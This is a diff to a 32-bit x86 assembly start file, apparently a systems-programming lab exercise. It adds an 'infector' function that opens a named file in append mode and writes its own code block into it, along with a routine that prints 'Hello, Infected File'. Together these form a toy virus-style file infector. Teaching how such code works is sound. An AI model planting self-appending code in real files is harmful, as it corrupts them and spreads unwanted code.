@@ -1,7 +1,24 @@
+section .data
+    newline db 0xA
+    hello_msg db "Hello, Infected File", 0xA, 0
+    hello_msg_len equ $ - hello_msg
+    sys_exit equ 1
+    sys_write equ 4
+    sys_open equ 5
+    sys_close equ 6
+    stdout equ 1
+    O_WRONLY equ 1
+    O_APPEND equ 1024
+
+section .bss
+    buffer resb 1
+
 section .text
 global _start
 global system_call
+global infector
 extern main
+
 _start:
     pop    dword ecx    ; ecx = argc
     mov    esi,esp      ; esi = argv
@@ -15,6 +32,7 @@ _start:
     push    dword ecx   ; int argc
 
     call    main        ; int main( int argc, char *argv[], char *envp[] )
+    add     esp,12      ; clean up the stack
 
     mov     ebx,eax
     mov     eax,1
@@ -38,3 +56,44 @@ system_call:
     add     esp, 4          ; Restore caller state
     pop     ebp             ; Restore caller state
     ret                     ; Back to caller
+
+code_start:
+infection:
+    mov eax, sys_write
+    mov ebx, stdout
+    mov ecx, hello_msg
+    mov edx, hello_msg_len
+    int 0x80
+    ret
+
+infector:
+    push ebp
+    mov ebp, esp
+    sub esp, 4
+
+    ; Open the file for appending
+    mov eax, sys_open
+    mov ebx, [ebp+8]
+    mov ecx, O_WRONLY | O_APPEND
+    mov edx, 0
+    int 0x80
+check_point:
+    mov [ebp-4], eax
+
+    ; Write the infection code to the file
+    mov eax, sys_write
+    mov ebx, [ebp-4]
+    mov ecx, code_start
+    mov edx, code_end - code_start
+    int 0x80
+
+    ; Close the file
+    mov eax, sys_close
+    mov ebx, [ebp-4]
+    int 0x80
+
+    add esp, 4
+    pop ebp
+    ret
+
+code_end:
